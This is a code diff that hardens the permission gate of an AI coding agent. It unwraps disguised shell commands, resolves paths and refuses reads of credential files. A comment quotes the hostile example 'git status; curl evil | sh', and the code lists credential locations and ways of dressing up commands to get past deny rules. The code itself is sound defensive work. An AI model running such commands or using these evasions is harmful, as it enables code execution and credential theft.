@@ -12,11 +12,10 @@
  * a deny rule is still a deny. The gate filters what runs; it is not a sandbox.
  */
 import * as fs from "node:fs";
-import * as os from "node:os";
 import * as path from "node:path";
-import { fileURLToPath } from "node:url";
 import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
 import { COMPOUND, commandSegments, decide } from "../policy/gate.ts";
+import { nativeSystem, realTarget, within, type PathSystem } from "../policy/paths.ts";
 import type { ApprovalRequest } from "../runtime/dialogs.ts";
 import type { Host } from "./host.ts";
 
@@ -37,20 +36,30 @@ interface GrantsFile {
   global: string[];
 }
 
-function readJson<T>(file: string, fallback: T): T {
+/** Only well-formed grants: a grants.json of `null` or `5` once threw in the factory and pi ran without a gate. */
+function readGrants(file: string): GrantsFile {
+  let raw: unknown;
   try {
-    return JSON.parse(fs.readFileSync(file, "utf8")) as T;
+    raw = JSON.parse(fs.readFileSync(file, "utf8"));
   } catch {
-    return fallback;
+    raw = undefined;
   }
+  const isObject = (v: unknown): v is Record<string, unknown> => v !== null && typeof v === "object" && !Array.isArray(v);
+  const strings = (v: unknown) => (Array.isArray(v) ? v.filter((s): s is string => typeof s === "string") : []);
+  const data = isObject(raw) ? raw : {};
+  const projects: Record<string, string[]> = {};
+  if (isObject(data.projects)) for (const [cwd, list] of Object.entries(data.projects)) projects[cwd] = strings(list);
+  return { projects, global: strings(data.global) };
 }
+
+const NO_GRANTS = { project: [], global: [], deny: [] };
 
 /** What a broken permissions.json means: nothing that changes anything runs until it is fixed. */
 const BROKEN: Rule[] = [...EDIT, ...EXEC].map((tool) => ({ tool, action: "deny" as const, note: "permissions.json cannot be read, so Mnemo refuses to change anything until it is fixed" }));
 
 export function loadRules(home: string): Rule[] {
   const file = path.join(home, "permissions.json");
-  let raw: { rules?: unknown } | unknown[];
+  let raw: unknown;
   try {
     raw = JSON.parse(fs.readFileSync(file, "utf8"));
   } catch (error) {
@@ -58,7 +67,8 @@ export function loadRules(home: string): Rule[] {
     // reading it as "no rules" would quietly turn every deny into nothing.
     return (error as NodeJS.ErrnoException).code === "ENOENT" ? [] : BROKEN;
   }
-  const list = Array.isArray(raw) ? raw : (raw as { rules?: unknown }).rules ?? [];
+  // `null`, a number or `{"rules": null}` is a file that cannot be understood, not "no rules".
+  const list = Array.isArray(raw) ? raw : raw !== null && typeof raw === "object" ? ("rules" in raw ? raw.rules : []) : undefined;
   if (!Array.isArray(list)) return BROKEN;
   const valid = (r: Rule) =>
     r && typeof r.tool === "string" && ["allow", "ask", "deny"].includes(r.action) && (r.pattern === undefined || typeof r.pattern === "string");
@@ -97,108 +107,199 @@ export function matchRule(rules: readonly Rule[], tool: string, subject: string)
   return rules.find((r) => globMatch(r.tool, tool) && (r.pattern === undefined || globMatch(r.pattern, subject)));
 }
 
-const SHELLS = /^(?:\S*\/)?(?:sh|bash|zsh|dash|ksh)$/;
-const WRAPPERS = new Set(["env", "sudo", "nohup", "time", "exec", "command", "nice", "builtin"]);
+const SHELLS = /^(?:sh|bash|zsh|dash|ksh)$/;
+/**
+ * Commands that run the rest of their words as a command, each with the options
+ * that take a value (so `sudo -u root rm` is read as `rm`, not as `root rm`).
+ */
+const WRAPPERS: Record<string, readonly string[]> = {
+  env: ["-u", "--unset", "-C", "--chdir"],
+  sudo: ["-u", "--user", "-g", "--group", "-C", "--close-from", "-D", "--chdir", "-h", "--host", "-p", "--prompt", "-r", "--role", "-t", "--type", "-T", "--command-timeout", "-U", "--other-user", "-R", "--chroot"],
+  doas: ["-u", "-C"],
+  nice: ["-n", "--adjustment"],
+  timeout: ["-s", "--signal", "-k", "--kill-after"],
+  xargs: ["-a", "--arg-file", "-d", "--delimiter", "-E", "-e", "-I", "-L", "-l", "-n", "--max-args", "-P", "--max-procs", "-s", "--max-chars"],
+  exec: ["-a"],
+  stdbuf: ["-i", "-o", "-e", "--input", "--output", "--error"],
+  ionice: ["-c", "--class", "-n", "--classdata"],
+  time: ["-f", "--format", "-o", "--output"],
+  nohup: [],
+  command: [],
+  builtin: [],
+  eval: [],
+};
+
+/** The words after a wrapper and its options: the command it runs. */
+function unwrap(wrapper: string, words: string[]): string[] {
+  const takesValue = WRAPPERS[wrapper]!;
+  let i = 1;
+  while (i < words.length && /^[-+]./.test(words[i]!)) {
+    if (words[i] === "--") {
+      i++;
+      break;
+    }
+    i += takesValue.includes(words[i]!) ? 2 : 1;
+  }
+  // `timeout 5 curl x`: the first operand is the duration.
+  if (wrapper === "timeout") i++;
+  return words.slice(i);
+}
+
+/**
+ * A command word as the shell finds the program: quotes and escapes gone
+ * (`"rm"`, `\rm`, `r''m`), directories dropped. Where names have no case
+ * (PowerShell, Windows), lower case and without `.exe`.
+ */
+function programName(word: string, ps: boolean, ci: boolean): string {
+  let w = ps ? word.replace(/['"`]/g, "").replace(/^.*[\\/]/, "") : word.replace(/['"\\]/g, "").replace(/^.*\//, "");
+  if (ci) w = w.toLowerCase().replace(/\.(?:exe|cmd|bat|com)$/, "");
+  return w;
+}
 
 /**
  * The ways a command line can be read: as typed, and as each command inside it
- * once spaces, `VAR=x` prefixes, directories (`/usr/bin/env`), wrappers (`sudo`,
- * `env`) and `sh -c '…'` are looked through. A rule that names a command is tested
- * against all of them, so `env*` also stops `true && /usr/bin/env` and `sh -c env`.
+ * once spaces, `VAR=x` prefixes, quotes, directories (`/usr/bin/env`), wrappers
+ * (`sudo -u root`, `env -u X`, `timeout 5`, `xargs`, `eval`), `find -exec` and
+ * `sh -c '…'` are looked through. A rule that names a command is tested against
+ * all of them, so `env*` also stops `true && /usr/bin/env` and `sh -c env`.
  * This is a filter for honest mistakes and injected prompts, not a parser of shell.
  */
-export function commandVariants(command: string, depth = 0): string[] {
+export function commandVariants(command: string, depth = 0, shell: "sh" | "powershell" = "sh"): string[] {
+  const ps = shell === "powershell";
+  const ci = ps || process.platform === "win32";
   const whole = command.trim().replace(/\s+/g, " ");
   const out = new Set<string>([whole]);
+  const nested = (inner: string) => {
+    if (depth < 3) for (const v of commandVariants(inner, depth + 1, shell)) out.add(v);
+  };
   // `sh -c '…'` as a whole first: splitting would cut the quoted command in two.
-  const wrapped = /^\s*(?:\S*\/)?(?:sh|bash|zsh|dash|ksh)\s+-\w*c\w*\s+(['"])([\s\S]*)\1\s*$/.exec(command);
-  if (wrapped && depth < 3) for (const v of commandVariants(wrapped[2]!, depth + 1)) out.add(v);
+  const wrapped = /^\s*(?:\S*\/)?(?:sh|bash|zsh|dash|ksh)\s+(?:(?:[-+]o\s+\w+|[-+]\w+)\s+)*?-\w*c\w*\s+(['"])([\s\S]*)\1\s*$/.exec(command);
+  if (wrapped) nested(wrapped[2]!);
   for (const segment of commandSegments(command)) {
     let words = segment.split(/\s+/);
-    words[0] = words[0]!.replace(/^['"]+/, "");
     const add = () => out.add(words.join(" "));
     add();
-    for (let guard = 0; guard < 6 && words.length; guard++) {
-      if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[0]!)) words = words.slice(1);
-      else if (words[0]!.includes("/")) words = [words[0]!.replace(/^.*\//, ""), ...words.slice(1)];
-      else if (WRAPPERS.has(words[0]!)) words = words.slice(1).filter((w, i) => i > 0 || !w.startsWith("-"));
+    for (let guard = 0; guard < 10 && words.length; guard++) {
+      const first = words[0]!;
+      if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(first)) words = words.slice(1);
+      else if (ps && (first === "&" || first === ".")) words = words.slice(1);
+      else if (programName(first, ps, ci) !== first) words = [programName(first, ps, ci), ...words.slice(1)];
+      else if (Object.hasOwn(WRAPPERS, first)) words = unwrap(first, words);
       else break;
       if (words.length) add();
     }
-    if (depth < 3 && words.length >= 3 && SHELLS.test(words[0]!) && /^-\w*c\w*$/.test(words[1]!)) {
-      const inner = words.slice(2).join(" ").replace(/^(['"])([\s\S]*)\1$/, "$2");
-      for (const v of commandVariants(inner, depth + 1)) out.add(v);
+    if (words.length >= 2 && SHELLS.test(words[0]!)) {
+      // `bash -e -o pipefail -c '…'`: options, then the command.
+      let i = 1;
+      let c = false;
+      while (i < words.length && /^[-+]\w/.test(words[i]!)) {
+        if (/^[-+]o$/.test(words[i]!)) i += 2;
+        else if (/^-\w*c\w*$/.test(words[i++]!)) {
+          c = true;
+          break;
+        }
+      }
+      if (c && i < words.length) nested(words.slice(i).join(" ").replace(/^(['"])([\s\S]*)\1$/, "$2"));
+    }
+    if (words[0] === "find") {
+      const at = words.findIndex((w) => /^-(?:exec|execdir|ok|okdir)$/.test(w));
+      if (at > 0 && at + 1 < words.length) nested(words.slice(at + 1).join(" "));
     }
   }
   return [...out].filter(Boolean);
 }
 
+/** Tools whose `path` names a file or folder the gate reasons about. */
+const PATH_TOOLS = new Set(["read", "grep", "find", "ls", "edit", "write"]);
+
 /** The subjects a rule on this call is tested against. */
 function subjectsOf(tool: string, subject: string): string[] {
-  return EXEC.has(tool) && tool !== "ipy_run" ? commandVariants(subject) : [subject.trim()];
-}
-
-function ruleHits(r: Rule, tool: string, subjects: readonly string[]): boolean {
-  return globMatch(r.tool, tool) && (r.pattern === undefined || subjects.some((s) => globMatch(r.pattern!, s)));
+  return EXEC.has(tool) && tool !== "ipy_run" ? commandVariants(subject, 0, tool === "powershell" ? "powershell" : "sh") : [subject.trim()];
 }
 
 /**
- * The path a pi tool will really open: it expands `~`, drops a leading `@`, reads `file://`.
- * `undefined` when it names nothing that exists as a path here (a `file:///etc/hosts` on
- * Windows has no drive), which is never inside the project.
+ * Where a file tool's path lands, as rules see it: relative to the project
+ * with `/` when it is inside, and absolute. Matching these rather than the
+ * text means `src/*` does not cover `src/../../etc/x`, and `.env*` covers
+ * `./.env`, `@.env` and `file:///…/.env`.
  */
-function toolPath(p: string): string | undefined {
-  let s = p.startsWith("@") ? p.slice(1) : p;
-  if (s === "~") return os.homedir();
-  if (s.startsWith("~/")) return path.join(os.homedir(), s.slice(2));
-  if (/^file:\/\//.test(s)) {
-    try {
-      s = fileURLToPath(s);
-    } catch {
-      return undefined;
-    }
-  }
-  return s;
+function landedSubjects(cwd: string, p: string, sys: PathSystem): string[] {
+  const target = realTarget(cwd, p, sys);
+  const root = sys.real(cwd);
+  if (target === undefined || root === undefined) return [];
+  const rel = within(root, target, sys);
+  const slash = (s: string) => (sys.windows ? s.replaceAll("\\", "/") : s);
+  return [...(rel === undefined ? [] : [rel === "" ? "." : slash(rel)]), target, ...(sys.windows ? [slash(target)] : [])];
 }
 
-/** Symlinks resolved as far as the path exists, the rest appended as written. */
-function realPath(p: string): string {
-  const tail: string[] = [];
-  let at = path.resolve(p);
-  for (;;) {
-    try {
-      return path.join(fs.realpathSync(at), ...tail.reverse());
-    } catch {
-      const up = path.dirname(at);
-      if (up === at) return path.join(at, ...tail.reverse());
-      tail.push(path.basename(at));
-      at = up;
-    }
-  }
+function ruleHits(r: Rule, tool: string, subjects: readonly string[], ci = false): boolean {
+  if (!globMatch(r.tool, tool)) return false;
+  if (r.pattern === undefined) return true;
+  const pattern = ci ? r.pattern.toLowerCase() : r.pattern;
+  return subjects.some((s) => globMatch(pattern, ci ? s.toLowerCase() : s));
 }
 
-/** Where code and configuration that run later live: never changed unasked, even by accept-edits. */
-const CONTROL_DIRS = new Set([".git", ".pi", ".agents", ".mnemo", ".husky", ".github", ".claude", ".vscode"]);
+/**
+ * An allow rule for a command ends on a word: `git status*` covers `git status`
+ * and `git status --short`, not `git statusx`. An allow widens what runs, so
+ * it gets the narrow reading; deny and ask keep the broad one.
+ */
+function allowHits(r: Rule, tool: string, subjects: readonly string[], ci: boolean, command: boolean): boolean {
+  if (!command || r.pattern === undefined || !/[^\s*]\*$/.test(r.pattern)) return ruleHits(r, tool, subjects, ci);
+  const stem = r.pattern.slice(0, -1);
+  return ruleHits({ ...r, pattern: stem }, tool, subjects, ci) || ruleHits({ ...r, pattern: `${stem} *` }, tool, subjects, ci);
+}
 
-function insideProject(cwd: string, p: unknown): boolean {
+/**
+ * Where code and configuration that run later live, at any depth: never
+ * changed unasked, even by accept-edits.
+ */
+const CONTROL_DIRS = new Set([".git", ".githooks", ".pi", ".agents", ".mnemo", ".husky", ".github", ".claude", ".vscode", ".idea", ".devcontainer"]);
+/** What a shell or ssh runs or trusts from the home folder. */
+const HOME_FILES = new Set([".bashrc", ".bash_profile", ".bash_login", ".bash_logout", ".profile", ".zshrc", ".zprofile", ".zshenv", ".zlogin", ".zlogout", ".cshrc", ".tcshrc", ".kshrc", ".inputrc", ".ssh", ".gitconfig", ".config", ".local"]);
+
+function insideProject(cwd: string, p: unknown, sys: PathSystem): boolean {
   if (typeof p !== "string") return false;
-  const target = toolPath(p);
-  if (target === undefined) return false;
-  const rel = path.relative(realPath(cwd), realPath(path.resolve(cwd, target)));
-  if (rel.startsWith("..") || path.isAbsolute(rel)) return false;
-  return !CONTROL_DIRS.has(rel.split(path.sep)[0]!.toLowerCase());
+  const target = realTarget(cwd, p, sys);
+  const root = sys.real(cwd);
+  if (target === undefined || root === undefined) return false;
+  const rel = within(root, target, sys);
+  if (rel === undefined) return false;
+  if (rel.split(/[\\/]/).some((part) => CONTROL_DIRS.has(part.toLowerCase()))) return false;
+  const home = sys.real(sys.home);
+  const inHome = home === undefined ? undefined : within(home, target, sys);
+  return !(inHome && HOME_FILES.has(inHome.split(/[\\/]/)[0]!.toLowerCase()));
 }
+
+/** Files and folders that hold credentials: no read tool needs them. */
+function secretLocations(host: { home?: string; agentDir?: string }, sys: PathSystem): string[] {
+  const j = sys.path.join;
+  const out = [j(sys.home, ".ssh"), j(sys.home, ".aws"), j(sys.home, ".gnupg")];
+  if (host.home) {
+    const agent = host.agentDir ?? j(host.home, "agent");
+    out.push(j(agent, "auth.json"), j(agent, "models.json"), j(host.home, "grants.json"), j(host.home, ".env"));
+  }
+  return out.map((p) => sys.real(p) ?? p);
+}
+
+/** A process's environment (where the provider keys are) and memory. */
+const PROC_SECRET = /^\/proc\/[^/]+\/(?:task\/[^/]+\/)?(?:environ|mem)$/;
 
 /** Credentials a read tool is never needed for. A rule in permissions.json can still allow them. */
-function secretPath(home: string | undefined, cwd: string, p: unknown): boolean {
+function secretPath(host: { home?: string; agentDir?: string }, cwd: string, p: unknown, sys: PathSystem): boolean {
   if (typeof p !== "string") return false;
-  const target = toolPath(p);
-  if (target === undefined) return false;
-  const real = realPath(path.resolve(cwd, target));
-  const bases = [path.join(os.homedir(), ".ssh"), path.join(os.homedir(), ".aws"), path.join(os.homedir(), ".gnupg")];
-  const files = home ? [path.join(home, "agent", "auth.json"), path.join(home, "grants.json")] : [];
-  const same = (a: string, b: string) => realPath(a) === real;
-  return files.some((f) => same(f, real)) || bases.some((b) => real === realPath(b) || real.startsWith(realPath(b) + path.sep));
+  const real = realTarget(cwd, p, sys);
+  if (real === undefined) return false;
+  if (!sys.windows && PROC_SECRET.test(real)) return true;
+  return secretLocations(host, sys).some((s) => within(s, real, sys) !== undefined);
+}
+
+/** A folder a search would read credentials in: one that holds any of them, or /proc. */
+function holdsSecrets(host: { home?: string; agentDir?: string }, cwd: string, p: string, sys: PathSystem): boolean {
+  const dir = realTarget(cwd, p, sys);
+  if (dir === undefined) return false;
+  if (!sys.windows && (within(dir, "/proc", sys) !== undefined || within("/proc", dir, sys) !== undefined)) return true;
+  return secretLocations(host, sys).some((s) => within(dir, s, sys) !== undefined);
 }
 
 /** Terminal control bytes made visible, so a command cannot hide part of itself in the question. */
@@ -242,17 +343,15 @@ export class Grants {
 
   constructor(home: string) {
     this.file = path.join(home, "grants.json");
-    this.data = readJson<GrantsFile>(this.file, { projects: {}, global: [] });
-    this.data.projects ??= {};
-    this.data.global ??= [];
+    this.data = readGrants(this.file);
   }
 
   for(cwd: string) {
-    return { project: this.data.projects[cwd] ?? [], global: this.data.global, deny: [] as string[] };
+    return { project: Object.hasOwn(this.data.projects, cwd) ? this.data.projects[cwd]! : [], global: this.data.global, deny: [] as string[] };
   }
 
   add(cwd: string, pattern: string): void {
-    const list = (this.data.projects[cwd] ??= []);
+    const list = Object.hasOwn(this.data.projects, cwd) ? this.data.projects[cwd]! : (this.data.projects[cwd] = []);
     if (!list.includes(pattern)) list.push(pattern);
     try {
       fs.mkdirSync(path.dirname(this.file), { recursive: true });
@@ -267,35 +366,55 @@ export type Verdict = { allow: true } | { allow: false; reason: string } | { ask
 
 /** The decision without the question: pure apart from reading `host.mode` and the disk (for symlinks). */
 export function judge(
-  host: Pick<Host, "mode"> & { home?: string },
+  host: Pick<Host, "mode"> & { home?: string; agentDir?: string },
   rules: readonly Rule[],
   grants: ReturnType<Grants["for"]>,
   cwd: string,
   tool: string,
   input: Record<string, unknown>,
+  sys: PathSystem = nativeSystem(),
 ): Verdict {
   const subject = subjectOf(tool, input);
-  const subjects = subjectsOf(tool, subject);
+  const kind = READ.has(tool) ? "read" : EDIT.has(tool) ? "edit" : EXEC.has(tool) ? "exec" : "other";
+  const command = kind === "exec" && tool !== "ipy_run";
+  const pathy = PATH_TOOLS.has(tool) && typeof input.path === "string";
+  const landed = pathy ? landedSubjects(cwd, input.path as string, sys) : [];
+  const subjects = pathy ? [subject.trim(), ...landed] : subjectsOf(tool, subject);
+  // Names without case: PowerShell and Windows commands, and paths where the file system folds case.
+  const ci = command ? tool === "powershell" || process.platform === "win32" : pathy && sys.fold;
   // A denial anywhere in the list wins, whatever order the rules are in and however
-  // the command is dressed up.
-  const denied = rules.find((r) => r.action === "deny" && ruleHits(r, tool, subjects));
+  // the command or path is dressed up.
+  const denied = rules.find((r) => r.action === "deny" && ruleHits(r, tool, subjects, ci));
   if (denied)
     return { allow: false, reason: `Refused by a rule in permissions.json (${denied.tool}${denied.pattern ? ` ${denied.pattern}` : ""})${denied.note ? `: ${denied.note}` : "."}` };
-  const kind = READ.has(tool) ? "read" : EDIT.has(tool) ? "edit" : EXEC.has(tool) ? "exec" : "other";
-  let rule = matchRule(rules, tool, subject.trim());
-  // An allow for `git status*` is not an allow for `git status; curl evil | sh`.
-  if (rule?.action === "allow" && kind === "exec" && tool !== "ipy_run" && COMPOUND.test(subject)) rule = undefined;
-  rule ??= rules.find((r) => r.action === "ask" && ruleHits(r, tool, subjects));
-  if (rule?.action === "allow") return { allow: true };
-  if (kind === "read" && secretPath(host.home, cwd, input.path))
-    return { allow: false, reason: "That file holds credentials, which Mnemo does not read. Add an allow rule in permissions.json if you need it." };
+  // Before any allow: plan mode is the user saying "change nothing", and a standing
+  // allow rule was written for the other modes.
   if (kind !== "read" && host.mode === "plan")
     return { allow: false, reason: "Plan mode is read-only: describe the change instead of making it. The user can leave plan mode with shift+tab." };
+  // First match among allow and ask. An allow for a path is tested only where the
+  // path lands, so `src/*` is not an allow for `src/../../etc/x`.
+  let rule = rules.find((r) =>
+    r.action === "allow"
+      ? allowHits(r, tool, pathy ? landed : [subject.trim()], ci, command)
+      : r.action === "ask" && ruleHits(r, tool, pathy ? subjects : [subject.trim()], ci),
+  );
+  // An allow for `git status*` is not an allow for `git status; curl evil | sh`.
+  if (rule?.action === "allow" && command && COMPOUND.test(subject)) rule = undefined;
+  rule ??= rules.find((r) => r.action === "ask" && ruleHits(r, tool, subjects, ci));
+  if (rule?.action === "allow") return { allow: true };
+  if (kind === "read" && secretPath(host, cwd, input.path, sys))
+    return { allow: false, reason: "That file holds credentials, which Mnemo does not read. Add an allow rule in permissions.json if you need it." };
+  // pi's grep searches hidden files: over `~` or Mnemo's home it would print the keys.
+  if (tool === "grep" && holdsSecrets(host, cwd, typeof input.path === "string" ? input.path : ".", sys))
+    return {
+      allow: false,
+      reason: "That folder holds credentials (~/.ssh, ~/.aws, ~/.gnupg, Mnemo's keys or /proc), which Mnemo does not search. Search a folder below it, or add an allow rule in permissions.json.",
+    };
   if (rule?.action !== "ask") {
     if (kind === "read" || host.mode === "yolo") return { allow: true };
     // Accept-edits is for files in this project. A skill is instructions loaded into
     // every later session, and `.git`, `.pi` and friends run code, so those still ask.
-    if ((tool === "edit" || tool === "write") && host.mode === "accept-edits" && insideProject(cwd, input.path)) return { allow: true };
+    if ((tool === "edit" || tool === "write") && host.mode === "accept-edits" && insideProject(cwd, input.path, sys)) return { allow: true };
   }
   const shown = subject.split("\n")[0]!;
   const request: ApprovalRequest = {
@@ -317,16 +436,31 @@ export function judge(
 
 export function policyExtension(host: Host) {
   return (pi: ExtensionAPI): void => {
-    const grants = new Grants(host.home);
+    // A factory that throws is dropped by pi, and the session then runs with no gate
+    // at all. So a gate that cannot start stays registered and refuses every change.
+    let grants: Grants | undefined;
+    let broken: string | undefined;
+    try {
+      grants = new Grants(host.home);
+    } catch (error) {
+      broken = error instanceof Error ? error.message : String(error);
+    }
     pi.on("tool_call", async (event, ctx) => {
       const input = (event.input ?? {}) as Record<string, unknown>;
-      const verdict = judge(host, loadRules(host.home), grants.for(ctx.cwd), ctx.cwd, event.toolName, input);
+      let verdict: Verdict;
+      try {
+        if (broken !== undefined && !READ.has(event.toolName))
+          return { block: true, reason: `Mnemo's permission gate could not start (${broken}), so it refuses every change until that is fixed.` };
+        verdict = judge(host, loadRules(host.home), grants?.for(ctx.cwd) ?? NO_GRANTS, ctx.cwd, event.toolName, input);
+      } catch (error) {
+        return { block: true, reason: `Mnemo's permission gate failed on this call (${error instanceof Error ? error.message : String(error)}), so it is refused.` };
+      }
       if ("allow" in verdict) return verdict.allow ? undefined : { block: true, reason: verdict.reason };
       if (!host.ui) return undefined;
       const answer = await host.ui.approve(verdict.ask, ctx.signal);
       if (answer.kind === "yes") return undefined;
       if (answer.kind === "always") {
-        if (verdict.pattern) grants.add(ctx.cwd, verdict.pattern);
+        if (verdict.pattern) grants?.add(ctx.cwd, verdict.pattern);
         else if (EDIT.has(event.toolName)) host.mode = "accept-edits";
         return undefined;
       }
